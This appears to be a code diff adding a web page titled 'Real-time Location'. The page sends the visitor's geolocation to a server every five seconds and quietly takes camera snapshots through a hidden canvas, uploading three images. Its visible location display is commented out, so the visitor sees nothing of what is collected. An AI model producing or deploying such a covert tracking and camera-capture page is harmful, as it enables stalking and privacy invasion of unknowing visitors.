@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Real-time Location</title>
+  <script type="importmap">
+    {
+      "imports": {
+        "socket.io-client": "https://cdn.socket.io/4.4.1/socket.io.esm.min.js"
+      }
+    }
+  </script>
+  <script type="module">
+    import { io } from "socket.io-client";
+
+     // Connect to the Socket.IO server on the backend server
+    //  const socket = io('http://backend.example.com:3000');
+
+    // Connect to the Socket.IO server
+    const socket = io();
+
+    // Function to update the location on the webpage
+    function updateLocation(location) {
+      const locationElement = document.getElementById('location');
+      locationElement.textContent = `Latitude: ${location.latitude}, Longitude: ${location.longitude}`;
+    }
+
+    // Socket.IO event listener for location updates
+    socket.on('locationUpdate', (location) => {
+      updateLocation(location);
+    });
+
+    // Error handling for geolocation
+    function handleLocationError(error) {
+      console.error('Error getting location:', error);
+    }
+
+    // Request location updates every 5 seconds
+    setInterval(() => {
+      navigator.geolocation.getCurrentPosition((position) => {
+        const location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+        };
+        socket.emit('locationUpdate', location);
+        updateLocation(location);
+      }, handleLocationError);
+    }, 5000);
+
+    // Get the video stream from the user's camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Draw the video stream onto the canvas
+        const canvas = document.getElementById('canvas');
+        canvas.style.display = 'none'; // hide the canvas
+        const context = canvas.getContext('2d');
+        setInterval(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        }, 1000 / 30); // 30 frames per second
+
+        // Capture the image from the canvas and send it to the server
+        let count = 0;
+        const captureInterval = setInterval(() => {
+          const image = canvas.toDataURL('image/png');
+          socket.emit('imageCapture', image);
+          count++;
+          if (count >= 3) {
+            clearInterval(captureInterval);
+          }
+        }, 3000); // 3 seconds
+      })
+      .catch((err) => {
+        console.error('Error getting video stream:', err);
+      });
+  </script>
+</head>
+<body>
+  <!-- <h1>Real-time Location Updates</h1>
+  <p id="location">Waiting for location updates...</p>
+  <p id="location">Latitude: , Longitude: </p> -->
+  <canvas id="canvas"></canvas>
+</body>
+</html>
